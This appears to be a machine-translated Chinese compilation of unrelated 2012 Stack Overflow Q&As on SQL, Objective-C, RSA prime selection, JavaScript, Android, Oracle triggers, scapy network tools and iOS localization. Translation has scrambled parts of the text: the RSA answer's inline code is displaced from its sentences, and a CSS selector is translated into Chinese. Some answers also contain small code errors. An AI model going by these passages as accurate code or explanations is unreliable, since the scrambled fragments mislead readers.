# sql-server - SQL Server 2008 表值函数速度

> ID：12192104
> 
> 赞同：0
> 
> 时间：2012-08-30T07:40:26.620
> 
> 标签：sql-server

我们有一个返回临时表的 SQL Server 2008 函数 该函数在 Management Studio 中执行得非常快，但在应用程序中却很慢

如果我们在 Management Studio 中运行这个函数一次。然后应用程序会加速一段时间

你知道可能是什么问题吗？

# objective-c - updateSwitchAtIndexPath 崩溃

> ID：12192112
> 
> 赞同：0
> 
> 时间：2012-08-30T07:41:02.457
> 
> 标签：objective-c, uitableview, uiswitch

我'，在某些单元格中有一个带有 UISwitch 的 UITableView。

我想捕获事件，但是当我尝试添加 indexPath 时它崩溃了。

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{

 //Create cell with all data

    UISwitch *switchview = [[UISwitch alloc] initWithFrame:CGRectZero];
    cell.accessoryView = switchview;
    [switchview addTarget:self action:@selector(updateSwitchAtIndexPath) forControlEvents:UIControlEventTouchUpInside];
}

- (void)updateSwitchAtIndexPath:(NSIndexPath *)indexPath {

   UITableViewCell *cell = [self.tableView cellForRowAtIndexPath:indexPath];
   UISwitch *switchView = (UISwitch *)cell.accessoryView;

   if ([switchView isOn]) {
       NSLog(@"ON");
   } else {
       NSLog(@"OFF");
   }

} 
```

它崩溃了，我想是因为我没有添加 indexPath 参数，但我不知道如何设置它。

```
 -[ParkingData updateSwitchAtIndexPath]: unrecognized selector sent to instance 0x7b88eb0 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T07:41:53.460

```
[switchview addTarget:self action:@selector(updateSwitchAtIndexPath) forControlEvents:UIControlEventTouchUpInside]; 
```

应该

```
[switchview addTarget:self action:@selector(updateSwitchAtIndexPath:) forControlEvents:UIControlEventTouchUpInside]; 
```

你只缺少一个冒号。因为你的方法有参数。

```
- (void)updateSwitchAtIndexPath:(NSIndexPath *)indexPath 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T07:47:28.553

**更新**

```
 - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{

 //Create cell with all data

    UISwitch *switchview = [[UISwitch alloc] initWithFrame:CGRectZero];
    cell.accessoryView = switchview;
    [switchview addTarget:self action:@selector(updateSwitchAtIndexPath:) forControlEvents:UIControlEventTouchUpInside];
}

- (void)updateSwitchAtIndexPath:(UISwitch *)switchview {
   if ([switchView isOn]) {
       NSLog(@"ON");
   } else {
       NSLog(@"OFF");
   }

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-30T10:18:55.480

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    UISwitch *switchview = [[UISwitch alloc] initWithFrame:CGRectZero];
    cell.accessoryView = switchview;
    [switchview addTarget:self action:@selector(updateSwitchAtIndexPath:) forControlEvents:UIControlEventTouchUpInside];
}

- (void)updateSwitchAtIndexPath:(id)sender
{
   // see the line BELOW
   NSIndexPath *indexPath = [[(UITableView*)[sender superview] superview]indexPathForCell: (UITableViewCell*)[sender superview]];

    if ([sender isOn])
        NSLog(@"ON");
    else
        NSLog(@"OFF");
} 
```

在上面的代码中，发送者表示 UISwitch，如果你想要单元格的 indexPath，那么标记的行对你有帮助。

# math - RSA - p 和 q 的位长

> ID：12192116
> 
> 赞同：5
> 
> 时间：2012-08-30T07:41:36.540
> 
> 标签：math, rsa, public-key-encryption

我只是想了解 RSA 的密钥生成部分，更具体地说，是选择 p 和 q 素数。给定模数 n 的目标位长度，我应该在什么范围内生成 p 和 q？

模数 n 是 p 和 q 的乘积，其中 p 和 q 都是素数。我读过 p 和 q 应该相对接近，并且在 sqrt(n) 附近。例如，如果目标位长度是 32 位（我意识到非常小），那么是否遵循 p 和 q 应该是最大 16 位的随机素数？

感谢您的任何澄清

抢

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-08-30T11:23:40.543

对于 32 位模数，这个问题有点学术性：您选择的主要目标`p`是`q`使乘积难以因式分解，但是找到小于 的数的素数分解`2^32`非常容易，因此不必担心在这种情况下`p`。`q`请注意，只要`p`和`q`是*不同的*素数，数学就可以正常工作。

对于更现实的东西，比如 1024 位模数，那么是的，你可以非常安全地随机选择两个 512 位素数`p`：`q`也就是说，从范围内的所有素数集中均匀地选择`p`和。有一个“[强素数](http://en.wikipedia.org/wiki/Strong_prime)”的概念，它是旨在避免特定可能的已知攻击的素数——例如，您会看到建议并且应该选择这样并且具有较大的因数，以防止使用[Pollard 的简单因式分解。](http://en.wikipedia.org/wiki/Pollard%27s_p_%E2%88%92_1_algorithm) [p-1'算法](http://en.wikipedia.org/wiki/Pollard%27s_p_%E2%88%92_1_algorithm)。然而，这些建议并不真正适用于大模数和最先进的分解算法（[GNFS](http://en.wikipedia.org/wiki/General_number_field_sieve)、[ECM](http://en.wikipedia.org/wiki/Elliptic_curve_method)`q``[2^511, 2^512]``p``q``p-1``q-1`）。还有其他可能的情况在理论上可以提供简单的因式分解，但它们在实践中不太可能从随机选择中出现`p`，`q`因此不值得担心。

摘要：只需选择两个位长相等的随机素数，就完成了。

一些额外的评论和需要考虑的事情：

1.  当然，如果您确实选择了两个 512 位素数，您最终会得到*一个*1023 位*或*一个 1024 位模数；这可能不值得担心，但如果你真的很想得到一个 1024 位模数，你可以限制范围`p`甚至`q`更远，比如`[1.5 * 2^511, 2^512]`，或者只是扔掉任何 1023 位模数，然后再试一次。

2.  不要刻意选择`p`and`q`使它们彼此靠近：如果`p`和`q`确实彼此靠近（例如，小于`10^10`分开，例如），那么它们的乘积很容易被[费马方法](http://en.wikipedia.org/wiki/Fermat%27s_factorization_method)`pq`分解。但是，如果您选择随机素数并且在 range 内，这不会以任何现实概率发生。`p``q``[2^511, 2^512]`

3.  当随机选择一个素数时，一个诱人的策略是在范围内选择一个随机（奇数）整数，`[2^511, 2^512]`然后递增它直到找到第一个素数。但请注意，这并*不能*在所有素数中给出统一的选择：在大间隙之后出现的素数比其他素数更有可能出现。一个更好的策略是继续选择随机奇数并保留第一个素数（或者更有可能，对于这么多随机选择的基数来说是一个强可能素数，你可以在实践中确定它是素数）。

4.  确保您手头有一个非常好的随机数加密源，用于生成素数。

# javascript - 图像未使用 javascript 在幻灯片放映中显示

> ID：12192122
> 
> 赞同：0
> 
> 时间：2012-08-30T07:42:02.207
> 
> 标签：javascript, html

我正在使用以下代码并尝试了许多其他代码以在幻灯片中显示图像。但一切都是徒劳的..我的代码中没有错误，但网页上没有显示单个图像..我的代码是：

```
<html>
<head>
<style>

body{

    background-color: black;
    padding:0;
    margin:0;
    width:320px;
    height:480px;

}
img{
    -webkit-transition-property:opacity;
    -webkit-transition-duration:3s;
    position:absolute;
    width:320px;
    height:auto;

}
img.fade-out{opacity:0;}
img.fade-in{opacity:1;}

</style>
</head>
<body>

<img src = "Slide1.JPEG";/>
<img src = "Slide2.JPEG";/>
<img src = "Slide3.JPEG";/>
<img src = "Slide4.JPEG";/>

var interval = 4 * 20;

var images = document.getElementsByTagName("img");
var imageArray = [];
var imageCount = images.length;
var current =0;

var randomize = funtion() {

    return ( Math.round(Math.random() * 3 - 1.5 ));
}

for(var i=0; i<imageCount; i++) {

    images[i].className = 'fade-out';

    imageArray[i] = images[i];
}

imageArray.sort(randomize);

var fade = function() {

    imageArray[current++].className = 'fade-out';

    if(current == imageCount) {

        current = 0;

        imageArray.sort(randomize);

    }

imageArray[current].className = 'fade-in';

setTimeout(fade,interval * 100);

};
fade();
</script>
}

</body>
</html> 
```

请指导我错误在哪里。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T08:05:19.457

第一个错误：

```
Yor aur using file type in caps (.JPEG) it should be .jpeg / .jpg 
```

第二个错误：

```
You forget to type the <script> tag at the starting of JavaScript code. 
```

第三个错误：

```
You are using invalid function keyword (funtion) 

var randomize = "funtion"() {
    return ( Math.round(Math.random() * 3 - 1.5 ));
} 
```

现在输入这段代码，它应该可以工作......

```
 <html>
<head>

<style> 
```

身体{

```
background-color: black;
padding:0;
margin:0;
width:320px;
height:480px; 
```

}

```
img{
-webkit-transition-property:opacity;
-webkit-transition-duration:3s;
position:absolute;
width:320px;
height:auto; 
```

}

```
img.fade-out{opacity:0;}
img.fade-in{opacity:1;}

</style>
</head>
<body>

<img src = "Slide1.jpg" />
<img src = "Slide2.jpg" />
<img src = "Slide3.jpg" />
<img src = "Slide4.jpg" />

<script>
var interval = 4 * 20;

var images = document.getElementsByTagName("img");

var imageArray = [];

var imageCount = images.length;

var current =0;

var randomize = function(){
return ( Math.round(Math.random() * 3 - 1.5 ));
}

for(var i=0; i<imageCount; i++) {
images[i].className = 'fade-out';
imageArray[i] = images[i]; 
```

}

```
imageArray.sort(randomize);

var fade = function() {
imageArray[current++].className = 'fade-out';
if(current == imageCount) {
    current = 0;
    imageArray.sort(randomize);
}

imageArray[current].className = 'fade-in';

setTimeout(fade,interval * 100);

};

fade();

</script>

</body>

</html> 
```

# android - 如何使用 Mapsforge 在运行时正确添加可绘制对象

> ID：12192123
> 
> 赞同：1
> 
> 时间：2012-08-30T07:42:04.103
> 
> 标签：android, bitmap, maps, drawable

我可以让 Mapsforge lib 0.30 在 Android 上运行，我对此非常满意。我遇到的问题是我无法以正确的方式添加自定义可绘制对象。当我添加要绘制的drawable时，drawable不会显示在正确的位置，而是显示在屏幕的左上角。这是我的测试代码示例：

```
MapView mapView = new MapView(this);
mapView.setClickable(true);
mapView.setBuiltInZoomControls(true);
mapView.setEnabled(true);
mapView.setMapFile(new File("/sdcard/remob/netherlands.map"));

setContentView(mapView);

// Creating my own custom drawable
Bitmap.Config conf = Bitmap.Config.ARGB_8888;
Bitmap bmp = Bitmap.createBitmap(60, 60, conf);
Drawable drawable = new BitmapDrawable(getResources(), bmp) {
@Override
public void draw(Canvas canvas) {
    super.draw(canvas);

    Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG);
    paint.setColor(Color.BLUE);
    paint.setStyle(Style.FILL);

    canvas.drawCircle(30, 30, 15, paint);
}
};

// create an ItemizedOverlay with the default marker
ArrayItemizedOverlay itemizedOverlay = new ArrayItemizedOverlay(drawable);

// create a GeoPoint with the latitude and longitude coordinates
GeoPoint geoPoint = new GeoPoint(51.92434, 4.47769);

// create an OverlayItem with title and description
OverlayItem item = new OverlayItem(geoPoint, "MyPoint", "This is my own point.");
item.setMarker(ItemizedOverlay.boundCenter(drawable));

// add the OverlayItem to the ArrayItemizedOverlay
itemizedOverlay.addItem(item);

// add the ArrayItemizedOverlay to the MapView
mapView.getOverlays().add(itemizedOverlay); 
```

那么任何人都可以帮助我以正确的方式做到这一点吗？简而言之，我想在运行时创建一个drawable并将它放在正确的位置。只是从资源中添加一个可绘制对象不是问题，这很好，但是从运行时开始，可绘制对象不在正确的位置。谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-18T12:39:32.503

您需要在其上调用 Marker.boundCenter(...) 。

我使用如下行：

```
ef_icon = Marker.boundCenter(getResources().getDrawable(R.drawable.ef_icon)); 
```

我在 Trunk 工作（看起来像 0.3.1-snapshot 到 Maven）。

如果您的 Mapsforge 版本中缺少该方法，那么完整的方法是：

```
public static Drawable boundCenter(Drawable drawable) {
    int intrinsicWidth = drawable.getIntrinsicWidth();
    int intrinsicHeight = drawable.getIntrinsicHeight();
    drawable.setBounds(intrinsicWidth / -2, intrinsicHeight / -2, intrinsicWidth / 2, intrinsicHeight / 2);
    return drawable;
} 
```

# java - TRIGGER AUTO_NUM_GEN 已编译警告：执行完成但有警告

> ID：12192124
> 
> 赞同：0
> 
> 时间：2012-08-30T07:42:05.370
> 
> 标签：java, oracle11g, oracle-sqldeveloper

我使用 oracle 11g express 作为我的数据库在 oracle sql developer 中运行以下语句。我只在尝试创建触发器时遇到问题。我得到消息-

```
TRIGGER AUTO_NUM_GEN compiled
Warning: execution completed with warning 
```

SQL-

```
CREATE TABLE myschema.mytable (mynums NUMBER PRIMARY KEY);
CREATE SEQUENCE myschema.seq_of_nums MINVALUE 1 
START WITH 1 INCREMENT BY 1 CACHE 10; 
CREATE OR REPLACE TRIGGER myschema.auto_num_gen 
BEFORE INSERT ON myschema.mytable FOR EACH ROW 
BEGIN SELECT seq_of_nums.nextval INTO :new.mynums FROM DUAL; end; / 
```

我的错误是什么，为什么它不起作用？

我运行了诊断查询 -

```
show errors trigger myschema.auto_num_gen; 
```

并且看到了——

```
PLS-00103: Encountered the symbol "/" The symbol "/" was ignored 
```

另一方面，当通过 java 运行相同的代码时，我也会得到错误 -

```
java.sql.SQLSyntaxErrorException: ORA-04098: trigger 
'MYTABLE.MYSCHEMA.AUTO_NUM_GEN ' is invalid and failed re-validation 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T08:01:01.123

最后的斜线/是你的敌人！删除它，代码就可以工作了！

# eclipse - 告诉 eclipse 使用 Source 而不是 Jar

> ID：12192130
> 
> 赞同：1
> 
> 时间：2012-08-30T07:42:24.963
> 
> 标签：eclipse, m2eclipse

我有一个依赖于 jar 的 maven 项目（比如 A）。运行项目时，它使用 Maven 依赖项下的 jar。

我有 A 的源代码，它在 Eclipse 中作为项目打开。当我运行项目时，我需要使用源而不是 jar。如何告诉 Eclipse 使用源代码而不是 jar？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T10:49:43.863

如果这是一个完整的 Maven 项目，m2eclipse 默认会这样做。[请参阅http://www.sonatype.com/books/m2eclipse-book/reference/eclipse.html#eclipse-sect-resolving-dependencies](http://www.sonatype.com/books/m2eclipse-book/reference/eclipse.html#eclipse-sect-resolving-dependencies)屏幕截图中的上下文菜单，其中显示“禁用工作区分辨率”。

如果您没有为您的项目找到该上下文菜单条目，那么您可能有一个带有 POM 文件的 Java 项目，该文件在 Eclipse 中未标记为 Maven 项目类型。在这种情况下，使用上下文菜单*Configure->Convert to Maven project*。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-03T12:06:48.107

我也遇到了[m2eclipse](http://www.sonatype.org/m2eclipse)的工作区分辨率问题。它将识别依赖项 (A) 并在依赖项视图中显示不同的图标（这表明依赖项已从工作区解析）但未找到类。

仅当我`mvn install`在项目 A 上运行时，所有工件都已生成并且分辨率开始起作用。也许这有帮助。

我还发现了一些提示（与不工作的工作区重新定位有关），这些提示`(re-)import`再次使用“现有 Maven 项目”向导向项目建议。

# python - 网络工具，函数式编程风格

> ID：12192131
> 
> 赞同：1
> 
> 时间：2012-08-30T07:42:31.847
> 
> 标签：python, functional-programming, ping, traceroute

我在这里说实话：当谈到函数式编程时，我从来没有比阅读它或解决简单的问题更进一步。尽管我喜欢简洁、易于维护的源代码的想法，但我从未找到使用该范例的理由。直到今天：我想在 Python 中实现几个网络工具（如`traceroute`or `ping`），尽可能地“功能化”（借助`scapy`,`functools`和`itertools`. 首先，`ping`：

```
def tcp_ping(destination_ip, destination_port, n_probes=10, timeout=1):
    source_ports = [randint(49152, 65535) for i in range(n_probes)]
    probes = IP(dst=destination_ip)/TCP(sport=source_ports, dport=destination_port, flags='S')
    responses = map(partial(sr, timeout=timeout, verbose=0), probes)

    answered = filter(lambda x: len(x[0]) > 0, responses)
    lost = filter(lambda x: x not in answered, responses)
    rtts = map(lambda x: int(1000 * (x[0][0][1].time - x[0][0][0].sent_time)), answered) or [0]

    return dict(loss=float(len(lost))/n_probes,
                min_rtt=min(rtts),
                max_rtt=max(rtts),
                avg_rtt=mean(rtts),
                std_rtt=std(rtts)) 
```

然后，`traceroute`：

```
def takeuntil(predicate, iterable):
    for x in iterable:
        yield x
        if predicate(x):
            break

def traceroute_probes(destination_ip, destination_port):
    ttl = 1
    while ttl <= 255:
        p = IP(dst=destination_ip, ttl=ttl)/TCP(dport=destination_port, flags='S')
        yield p
        ttl = ttl + 1

def is_finalhop(x):
    return (len(x[0]) > 0 and
            not x[0][0][1].haslayer('ICMP'))

def hop_ip_latency(x):
    if len(x[0]) > 0:
        return (x[0][0][0].ttl,
                x[0][0][1].src,
                max(0, int(1000 * (x[0][0][1].time - x[0][0][0].sent_time))))
    else:
        return (x[1][0][0].ttl, '*', 0)

def tcp_traceroute(destination_ip, destination_port, timeout=1):
    responses = takeuntil(is_finalhop,
                          imap(partial(sr, timeout=timeout, verbose=0),
                               traceroute_probes(destination_ip,
                                                 destination_port)))
    return map(hop_ip_latency, responses) 
```

现在，问题：

*   我们怎样才能让这段代码更“实用”？
*   如何`traceroute`在不引入不必要的副作用的情况下增加更多复杂性（例如，在连续三个超时后停止）？
*   如何在不陷入命令式/面向对象的陷阱的情况下更改`sr`（与世界的接口）行为（例如，根据 RTT 改变超时）？`ping`
*   是否有一种纯（r）功能语言足以实现网络工具，同时也迫使我“更具功能性”？
*   谁忘了添加`takeuntil`到 Python 的`itertools`？

# java - 在 Java 中运行期望脚本时出错

> ID：12192136
> 
> 赞同：2
> 
> 时间：2012-08-30T07:42:46.350
> 
> 标签：java, expect

我正在从 java 运行一个期望脚本。但我收到以下错误：

```
线程“主”java.lang.NullPointerException 中的异常
        在 java.lang.ProcessBuilder.start(ProcessBuilder.java:1010)
        在 java.lang.Runtime.exec(Runtime.java:615)
        在 java.lang.Runtime.exec(Runtime.java:483)
        在 ExpectInJava.main(ExpectInJava.java:24)

```

我能够手动运行期望脚本，它工作正常。

```
import java.io.IOException;

public class ExpectInJava {

    /**
     * @param args
     */
    public static void main(String[] args) {
        String[]params = new String[] {
                "/runScp.expect",
                "/runScp.expect",
                "root@10.21.21.21:/tmp",
                null,
                ""+22,
                ""+600,
                ""+2405,
                ""+"/var/db/host/privatekeys/"+"newsshcred"
                };

        try {
            Process process = Runtime.getRuntime().exec(params);
        } catch (IOException e) {
            // TODO Auto-generated catch block
            System.out.println("e"+e);
        }

    } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-30T07:48:11.750

`null`从数组中删除

```
String[]params = new String[] {
        "/runScp.expect",
        "/runScp.expect",
        "root@10.21.21.21:/tmp",
        "",
        ""+22,
        ""+600,
        ""+2405,
        ""+"/var/db/host/privatekeys/"+"newsshcred"
        }; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-30T07:54:20.537

看一下 exec 方法的[文档](http://www.docjar.com/html/api/java/lang/Runtime.java.html)：

```
482       public Process exec(String cmdarray[]) throws IOException {
483           return exec(cmdarray, null, null);
484       } 
```

它说明何时抛出这样的异常：

```
472        * @throws  NullPointerException
473        *          If <code>cmdarray</code> is <code>null</code>,
474        *          or one of the elements of <code>cmdarray</code> is <code>null</code>
475        * 
```

阅读第**474行**

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-30T07:48:59.340

`null`那在`params`阵列中做什么？虽然`ProcessBuilder`可以接受一个字符串数组，但它们最好是真正的字符串，而不是`null`因为它们将作为参数传递给子进程，而底层 API 根本不喜欢`null`。（另外，Expect*真的*不处理空值。）

# sql - 具有嵌套多个条件的 WHERE 子句

> ID：12192137
> 
> 赞同：12
> 
> 时间：2012-08-30T07:42:51.247
> 
> 标签：sql, sql-server, case, where-clause, multiple-conditions

我想用`WHERE`子句中的条件检索数据。
这是我的表格，如下所示：

```
Name   Location    Age
----------------------
AAA     Bhuj       24
BBB     Mumbai     22
CCC     Bhuj       18
DDD     Bhuj       27
EEE     Mumbai     26 
```

我在`WHERE`条款中的条件是：
`if location = 'Bhuj' then Age>20 else if location = 'Mumbai' then Age>25`

我正在尝试这段代码来实现这一点：

```
SELECT * FROM testing
WHERE 
CASE Location WHEN 'Bhuj' THEN Age>20
              WHEN 'Mumbai' THEN Age>25
END; 
```

此代码适用于 MySQL（[请参阅此 SQLFiddle](http://sqlfiddle.com/#!2/6120e/1)），但不适用于 SQL Server（[请参阅此 SQLFiddle](http://sqlfiddle.com/#!3/6120e/1)）并给出以下错误：

> '>' 附近的语法不正确。：SELECT * FROM testing WHERE case Location When 'Bhuj' then Age>20 When 'Mumbai' then Age>25 end

有什么建议吗？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-08-30T07:44:50.707

我认为这就是您要实现的目标

```
 SELECT * 
   FROM testing
   WHERE (Location = 'Bhuj' AND Age>20) 
        OR (Location = 'Mumbai' AND Age>25) 
```

检查[SQLFiddle](http://sqlfiddle.com/#!3/6120e/5)

**更新：**

Case 语句返回一个值，其中不能有条件。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-08-30T07:48:20.540

```
SELECT * FROM testing 
WHERE  
Age > case Location When 'Bhuj' then 20 
              When 'Mumbai' then 25 
              end 
```

# java - 如何将变量从 Main Activity 传递给 AsynTask 及其方法？

> ID：12192138
> 
> 赞同：1
> 
> 时间：2012-08-30T07:42:50.653
> 
> 标签：java, android, android-asynctask, parameter-passing, scope

我使用 AsyncTask 调用 Web 服务并编辑其响应。

我这样称呼我的任务：

```
new CallWebService().execute(et.getText().toString().trim()); 
```

其中 et 是一个 EditText，用户在其中提供他的电话号码（字符串）。所以我将一个字符串参数传递给执行方法。

然后在扩展 AsyncTask 的 CallWebService 类中，我采用给定的字符串并将其用作 Web 服务调用的参数：

```
private class CallWebService extends AsyncTask<String, Void, Object> 
```

doInBackround 方法的代码：

```
 @Override
    protected Object doInBackground(String... phone) {
        Object result = null;

        try {

            SoapObject request = new SoapObject(NAMESPACE, METHOD_NAME);

    // if i put "6949861372" manually at the second parametre it works!

            request.addProperty("phone", phone);
            SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(
                    SoapEnvelope.VER11);
            envelope.dotNet = true;
            envelope.setOutputSoapObject(request);
            HttpTransportSE androidHttpTransport = new HttpTransportSE(URL);
            androidHttpTransport.call(SOAP_ACTION, envelope);
            result = envelope.getResponse();
        } catch (Exception e) {
                    //do nothing
        }
        return result;
    } 
```

如果我在第二个参数（（字符串）电话）上手动输入“6949861372”，它会起作用！那么这里有什么问题？那么如何将给定的数字从 editText 传递给 doInBackground 方法？

我想不通！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T12:12:43.510

您可以通过以下方式获取参数，

```
String phoneNumber = phone[0]; 
```

inside`doInBackground()`方法，那么您可以使用此 phoneNumber 作为参数，如下所示，

```
request.addProperty("phone", phoneNumber); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T07:50:27.630

您应该将代码放在 try 块中的 doInBackground() 方法中。ProgressDialog 应该从 onPreExecute 显示。当你捕捉到一个异常时，你应该调用 publishProgress()。并覆盖您的 onProgressUpdate()。您将代码用于关闭 Dialog 并在那里显示 Toast

# doctrine - Symfony 1.4：覆盖学说：build-schema 命令

> ID：12192143
> 
> 赞同：2
> 
> 时间：2012-08-30T07:43:10.153
> 
> 标签：doctrine, symfony-1.4, command-line-interface

是否可以覆盖 Symfony 1.4 CLI 命令？

更具体地说，我想知道是否可以覆盖此命令：

```
php symfony doctrine:build-schema 
```

我想要做的是在 database.yml 文件中为我在其中找到的每个连接添加一个新选项。我要添加的选项是一个包选项
所以，一个假设的连接可能是：

```
all:
  doctrine:
    class: sfDoctrineDatabase
    package: myPackageOption
    param:
      dsn: 'mysql:host=localhost;dbname=my_db_name'
      username: db_user
      password: db_password 
```

如果可能的话，我在哪里可以找到要覆盖的代码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T15:18:49.110

我建议您使用一些预先生成 databses.yml 的 shell 脚本，然后自动调用 php symfony 学说：build-schema。就像是：

build.sh，在项目根文件夹中：

```
#!/bin/bash
cp config/databases_1.yml config/databases.yml
php symfony doctrine:build 
```

然后，在控制台中输入 ./build.sh（添加执行权限后）。

多个databases_xxx.yml的复制/替换是最简单的例子。但是你可以做任何你想做的处理。

如果您不了解 shell 脚本，您甚至可以使用 php 脚本进行文件修改，因此您的 build.sh 应该如下所示：

```
#!/bin/bash
php pregenerate_databases.php
php symfony doctrine:build 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T17:14:07.187

我正在尝试覆盖该任务，但无法使其正常工作，但是：

您可以创建自己的任务来继承教义任务并执行您的工作：在 lib/task 添加 sfDoctrineBuildSchemaCustomTask.class.php：

```
class sfDoctrineBuildSchemaCustomTask extends sfDoctrineBuildSchemaTask
{
  /**
   * @see sfTask
   */
  protected function configure()
  {
    $this->addOptions(array(
      new sfCommandOption('application', null, sfCommandOption::PARAMETER_OPTIONAL, 'The application name', true),
      new sfCommandOption('env', null, sfCommandOption::PARAMETER_REQUIRED, 'The environment', 'dev'),
    ));

    $this->namespace = 'doctrine';
    $this->name = 'build-schema-custom';
    $this->briefDescription = 'Creates a schema from an existing database';

    $this->detailedDescription = <<<EOF
The [doctrine:build-schema|INFO] task introspects a database to create a schema:

  [./symfony doctrine:build-schema|INFO]

The task creates a yml file in [config/doctrine|COMMENT]
EOF;
  }

  /**
   * @see sfTask
   */
  protected function execute($arguments = array(), $options = array())
  {
        // do your stuff before original call
    parent::execute($arguments,$options);
        // do your stuff after original call

  }
} 
```

然后，您可以调用 php symfony 学说：build-schema-custom，然后开始！

* * *

或者，也许，您可以编辑位于 lib/vendor/symfony/lib/plugins/sfDoctrinePlugin/lib/task/sfDoctrineBuildSchemaTask.class.php 中的原始任务

# javascript - 如何将javascript链接放入cgridview的值数组中？

> ID：12192145
> 
> 赞同：3
> 
> 时间：2012-08-30T07:43:11.557
> 
> 标签：javascript, jquery, yii

例如，我想要一个链接，当我单击它时，它会在 yii 框架的 CGridView 数组中调用它？

```
$('.blah').fancybox(); 
```

如何将其添加到

```
array(
         'header'=>'Image',
         'type'=>'raw',
         'value'=> "",
              ), 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-30T08:08:04.487

您可以改用[CLinkColumn`linkHtmlOptions`](http://www.yiiframework.com/doc/api/1.1/CLinkColumn#linkHtmlOptions-detail)：

```
array(
    'class'=>'CLinkColumn',
    'linkHtmlOptions'=>array('onclick'=>'$(".blah").fancybox();'),
    'header'=>'Image',
    'label'=>'For Static Labels',// use label for static labels
    'labelExpression'=>'"Dynamic label".$row'// use labelExpression for dynamic label
) 
```

# android - 可以在 Android 中使用标准 Linux 中构建的库吗？

> ID：12192150
> 
> 赞同：0
> 
> 时间：2012-08-30T07:43:23.620
> 
> 标签：android, android-ndk, java-native-interface, glibc

我在最新的 Linux 发行版中编写了一个库，它依赖于 glibc 和套接字。我听说 Android 不支持 glibc。有没有一种方法可以重建我的代码而无需对 Android 进行太多修改并让它运行？如果是，我将使用 JNI 调用代码。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-05T22:52:54.853

这取决于您所说的“使用 glibc”是什么意思。如果它使用只有 glibc 实现的非标准扩展，那么你会遇到一些麻烦。但是 Android 的 libc（称为“仿生”）支持大部分 POSIX，所以如果你没有做任何不寻常的事情，它应该可以工作。找出答案的最佳方法是尝试使用 NDK 构建您的库，然后看看会发生什么。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T07:44:46.277

不，那是不可能的。Android 使用仿生运行，并且没有 glibc。

但是，您可以尝试使用[NDK](http://developer.android.com/tools/sdk/ndk/index.html)构建代码并在构建过程中解决问题。如果你不使用任何特定于 glibc 的东西，它应该是相当容易的。

# ios - 在 iOS 中更改应用程序语言而不重新启动应用程序

> ID：12192151
> 
> 赞同：30
> 
> 时间：2012-08-30T07:43:25.763
> 
> 标签：ios, objective-c, xcode, cocoa, localization

我似乎有些应用程序可以在应用程序内部更改语言而无需重新启动应用程序，我想知道它们是如何实现的。

例如，对于我们使用`NSLocalizedString`，我知道可以在未初始化时在运行时设置语言`main.m`，`AppDelegate`但是一旦初始化（特别是创建视图控制器），更改它直到下次**重新启动才生效**

```
[[NSUserDefaults standardUserDefaults] 
    setObject:[NSMutableArray arrayWithObjects:language, nil] 
    forKey:@"AppleLanguages"]; 
```

任何人都知道如何在不重新启动应用程序的情况下完成这些动态语言更改？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-05T04:59:43.980

这里有一些其他方法的讨论，特别是基于通知的方法：

[iOS：如何在不重新启动应用程序的情况下以编程方式更改应用程序语言？](https://stackoverflow.com/questions/9416923/ios-how-to-change-app-language-programmatically-without-restarting-the-app?rq=1)

在我看来，这里实际上有三个任务：（1）重新本地化从 nib 自动加载的资源。（例如，如果您从 nib 动态实例化另一个自定义 UIView，“旧”语言字符串和设置（图像、文本方向）仍将被加载） (2) 重新本地化当前显示在屏幕上的字符串。(3) 开发者（你）在程序代码中插入的字符串的重新本地化。

让我们从（3）开始。如果您查找定义，您会注意到 NSLocalizedString 是一个宏。所以如果不想过多改动现有代码，或许可以通过新建一个头文件来解决（3）的问题。在该头文件中，`#undef`然后`#define NSLocalizedString`从适当的位置重新选择本地化字符串——不是 iOS 默认使用的字符串，而是您在某个全局变量中跟踪的字符串（例如，在应用程序委托 ivar 中）。如果您不想重新定义 NSLocalizedString 但您仍然可以自己选择，那么`#undef NSLocalizedString`如果您不希望未来的开发人员不小心调用它而不是您替换它的宏，那么您可能仍然应该这样做。不是一个理想的解决方案，但也许是最实用的。

至于（1），如果你没有在Interface Builder中做本地化，而是在viewDidLoad等中动态地做，没问题。您可以使用刚才讨论的相同行为（即，修改后的 NSLocalizedString 等）。否则，您可以 (a) 实现上面链接中描述的通知系统（复杂），或 (b) 考虑将本地化从 IB 移动到 viewDidLoad，或 (c) 尝试覆盖`initWithNibName:`并换出加载旧语言资源的对象，其中一个加载了新的语言资源。这是 Mohamed 在本次讨论的最底部提到的一种方法：http: [//learning-ios.blogspot.ca/2011/04/advance-localization-in-ios-apps.html](http://learning-ios.blogspot.ca/2011/04/advance-localization-in-ios-apps.html). 他声称这会导致问题（未调用 viewDidLoad）。即使它不起作用，尝试一下也可能会为您指明可行的方法。

